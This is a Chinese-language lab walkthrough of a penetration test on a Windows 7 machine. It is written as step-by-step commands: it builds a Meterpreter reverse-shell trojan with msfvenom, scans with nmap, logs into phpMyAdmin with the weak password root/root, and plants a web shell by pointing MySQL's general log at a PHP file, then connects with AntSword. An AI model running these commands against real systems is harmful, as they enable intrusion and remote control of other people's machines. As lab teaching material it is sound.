输入msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[kaliIP] LPORT=7777 -f exe -o tese.exe创建一个木马文件 ceshi 1. 首先打开win7-命令提示符输入ipconfig获取被渗透的ip ![获取IP](../images/1.png) 打开kali管理员面板，输入nmap192.168.127.134/24对自己的网段进行扫描 ![](../images/2.png) 其中扫描出来的192.168.127.134就是要攻击的靶机 输入sudo su改为root权限，方便后续扫描 ![切换](../images/3.png) 使用nmap进行详细扫描 再输入nmap -sT -sV -O -p- 192.168.127.134 -oN scan 其中-sT是进行TCP扫描，-sV是进行版本扫描，-O是对操作系统进行扫描，-p是扫描所有端口，目标主机的IP地址，-oN scan是将扫描结果以纯文本形式保存到scan文件中，方便后续查看 ![](../images/4.png) 用漏洞脚本进行扫描 输入nmap --script=vuln -p135,139,445,1025 192.168.127.134 -oN vul其中--script=vuln调用nmap的漏洞脚本库对目标进行检测，-p135,139,445,1025是指定扫描目标主机的几个端口 ![](../images/5.png) 会发现有phpmyadmin弱口令root/root成功登录数据库 ![](../images/6.png) ![](../images/7.png) 查看配置show variables 可得到网站mysql路径和其他配置信息 ![](../images/8.png) 查看mysql用户权限show GRANTS 是root权限，所有权限都开放 ![](../images/9.png) 输入show variables like '%general%'查看日志状态 ![](../images/10.png) 输入set global general_log='ON'开启通用查询日志将日志记录打开， ![](../images/11.png) 将日志写入到C://phpStudy//WWW//shell.php```set global general_log_file = "C://phpStudy//WWW//shell.php"; set global general_log = "on"; show variables like '%general%';``` 再mysql里执行一句话木马,写入日志文件 ![](../images/12.png) 打开蚁剑，添加数据链接 ![](../images/13.png)
